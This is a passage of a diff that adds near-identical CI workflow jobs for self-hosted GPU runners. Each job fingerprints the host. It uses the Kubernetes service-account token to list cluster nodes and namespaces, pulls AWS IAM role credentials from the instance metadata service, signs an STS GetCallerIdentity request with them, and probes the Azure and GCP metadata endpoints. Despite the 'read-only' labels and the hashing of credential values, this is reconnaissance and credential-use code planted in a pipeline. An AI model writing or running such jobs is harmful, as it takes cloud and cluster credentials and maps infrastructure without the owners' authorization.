+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  mi35x2-a:
+    runs-on: linux-mi35x-gpu-2
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: mi35x2-a
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  mi35x2-b:
+    runs-on: linux-mi35x-gpu-2
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: mi35x2-b
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
+          m2=re.search(r'<Code>([^<]+)</Code>',b2)
+          print('STS_TAMPERED_STATUS',s2,'STS_TAMPERED_CODE',m2.group(1) if m2 else None)
+          " 2>&1 | head -6 || echo STS_SKIPPED
+              fi
+            fi
+          fi
+          echo "--- other-cloud metadata (presence only) ---"
+          echo "AZURE_IMDS_STATUS=$(curl -sS -o /tmp/c211_az.json -w '%{http_code}' --max-time 4 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null || echo ERR)"
+          echo "GCP_METADATA_STATUS=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 4 -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/id' 2>/dev/null || echo ERR)"
+          echo "C211_DENSE_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
+
+  g5090-a:
+    runs-on: 1-gpu-5090
+    timeout-minutes: 15
+    steps:
+      - name: device-and-identity
+        env:
+          NONCE: c211-i124924-df7c4e8eed018c58
+          JOBTAG: g5090-a
+        run: |
+          set -u
+          ts(){ date -u +%FT%TZ; }
+          echo "C211_DENSE_BEGIN job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          id 2>&1 || true
+          echo "UNAME=$(uname -a 2>&1)"
+          echo "HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1)"
+          echo "SELF_CGROUP=$(head -3 /proc/self/cgroup 2>&1 | tr '\n' '|')"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "$PRETTY_NAME")"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          echo "--- gpu identity nvidia (read-only) ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            timeout 30 nvidia-smi -L 2>&1 | head -16 || echo NVIDIA_SMI_L_FAILED
+            timeout 30 nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16 || echo NVIDIA_SMI_QUERY_FAILED
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "--- gpu identity amd (read-only) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            timeout 40 rocm-smi --showuniqueid --showproductname 2>&1 | head -120 || echo ROCM_SMI_FAILED
+          else
+            echo ROCM_SMI_ABSENT
+          fi
+          if command -v amd-smi >/dev/null 2>&1; then
+            timeout 40 amd-smi static 2>&1 | head -160 || echo AMD_SMI_FAILED
+          else
+            echo AMD_SMI_ABSENT
+          fi
+          echo "--- k8s presence + read-only inventory ---"
+          SA=/var/run/secrets/kubernetes.io/serviceaccount
+          if [ -s "$SA/token" ]; then echo "K8S_SA_TOKEN_PRESENT=1"; else echo "K8S_SA_TOKEN_PRESENT=0"; fi
+          echo "KUBERNETES_SERVICE_HOST=${KUBERNETES_SERVICE_HOST:-unset} KUBERNETES_SERVICE_PORT=${KUBERNETES_SERVICE_PORT:-unset}"
+          echo "K8S_SA_NAMESPACE=$(cat $SA/namespace 2>/dev/null || echo none) K8S_SA_CA_PRESENT=$([ -e $SA/ca.crt ] && echo 1 || echo 0)"
+          if [ -s "$SA/token" ] && command -v curl >/dev/null 2>&1; then
+            KH="${KUBERNETES_SERVICE_HOST:-kubernetes.default.svc}"
+            KP="${KUBERNETES_SERVICE_PORT:-443}"
+            code=$(curl -sS -o /tmp/c211_nodes.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/nodes?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NODES_STATUS=$code"
+            if [ "$code" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_nodes.json'))
+          items=d.get('items') or []
+          print('K8S_NODE_COUNT',len(items))
+          tot=0; gpu=[]
+          for n in items:
+              md=n.get('metadata') or {}; al=((n.get('status') or {}).get('allocatable') or {})
+              g=al.get('nvidia.com/gpu')
+              try: gi=int(g)
+              except Exception: gi=0
+              tot+=gi
+              lab=md.get('labels') or {}
+              prod=lab.get('nvidia.com/gpu.product') or lab.get('amd.com/gpu.product') or ''
+              if gi or prod: gpu.append((md.get('name'),gi,prod))
+          print('K8S_GPU_ALLOCATABLE_TOTAL',tot)
+          for x in gpu[:40]: print('K8S_GPU_NODE',x[0],x[1],x[2])
+          " 2>&1 | head -50 || echo K8S_PARSE_SKIPPED
+            fi
+            code2=$(curl -sS -o /tmp/c211_ns.json -w '%{http_code}' --max-time 12 --cacert "$SA/ca.crt" -H "Authorization: Bearer $(cat $SA/token)" "https://$KH:$KP/api/v1/namespaces?limit=500" 2>/dev/null || echo ERR)
+            echo "K8S_NAMESPACES_STATUS=$code2"
+            if [ "$code2" = "200" ] && command -v python3 >/dev/null 2>&1; then
+              python3 -c "
+          import json
+          d=json.load(open('/tmp/c211_ns.json'))
+          items=d.get('items') or []
+          print('K8S_NAMESPACE_COUNT',len(items))
+          print('K8S_NAMESPACE_NAMES',','.join([(x.get('metadata') or {}).get('name','') for x in items])[:900])
+          " 2>&1 | head -5 || echo K8S_NS_PARSE_SKIPPED
+            fi
+          else
+            echo K8S_INVENTORY_SKIPPED
+          fi
+          echo "--- imdsv2 + sts fingerprint (read-only) ---"
+          T2=""
+          if command -v curl >/dev/null 2>&1; then
+            T2=$(curl -sS --max-time 4 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' http://169.254.169.254/latest/api/token 2>/dev/null || true)
+          fi
+          if [ -n "${T2:-}" ]; then echo "IMDS_TOKEN_PRESENT=1"; else echo "IMDS_TOKEN_PRESENT=0"; fi
+          echo "IMDSV1_CONTROL_INSTANCE_ID=$(curl -sS --max-time 3 http://169.254.169.254/latest/meta-data/instance-id 2>/dev/null | head -c 80 || true)"
+          IMDS(){ curl -sS --max-time 4 -H "X-aws-ec2-metadata-token: $T2" "http://169.254.169.254/latest/$1" 2>/dev/null || true; }
+          if [ -n "${T2:-}" ]; then
+            echo "IMDS_INSTANCE_ID=$(IMDS meta-data/instance-id | head -c 80)"
+            echo "IMDS_INSTANCE_TYPE=$(IMDS meta-data/instance-type | head -c 80)"
+            echo "IMDS_AZ=$(IMDS meta-data/placement/availability-zone | head -c 80)"
+            echo "IMDS_IAM_INFO=$(IMDS meta-data/iam/info | head -c 400)"
+            ROLE=$(IMDS meta-data/iam/security-credentials/ | head -1)
+            echo "IMDS_ROLE=$ROLE"
+            if [ -n "$ROLE" ]; then
+              IMDS "meta-data/iam/security-credentials/$ROLE" > /tmp/c211_creds.json 2>/dev/null || true
+              if command -v python3 >/dev/null 2>&1; then
+                python3 -c "
+          import json,hashlib
+          try: d=json.load(open('/tmp/c211_creds.json'))
+          except Exception as e:
+              print('CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('CRED_FIELDS',json.dumps({'AccessKeyId_fp':f(d.get('AccessKeyId')),'SecretAccessKey_fp':f(d.get('SecretAccessKey')),'Token_fp':f(d.get('Token')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          " 2>&1 | head -3 || echo CRED_PARSE_SKIPPED
+                python3 -c "
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          def sts(ak,sk,tk):
+              host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+              t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+              creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+              sh='content-type;host;x-amz-date'
+              if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+              creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+              scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+              ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+              k=('AWS4'+sk).encode()
+              for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+              sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+              h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+              if tk: h['X-Amz-Security-Token']=tk
+              r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+              try:
+                  x=urllib.request.urlopen(r,timeout=8); return x.status,x.read().decode()
+              except urllib.error.HTTPError as e: return e.code,e.read().decode()
+              except Exception as e: return -1,str(e)[:160]
+          if not ak or not sk: print('STS_NO_CREDS'); raise SystemExit
+          s,b=sts(ak,sk,tk)
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_STATUS',s,'STS_ARN',m.group(1) if m else None,'STS_ACCOUNT',a.group(1) if a else None,'STS_USERID_fp',hashlib.sha256((u.group(1) if u else '').encode()).hexdigest()[:16])
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:300])
+          s2,b2=sts(ak,str(sk)+'TAMPERED',tk)
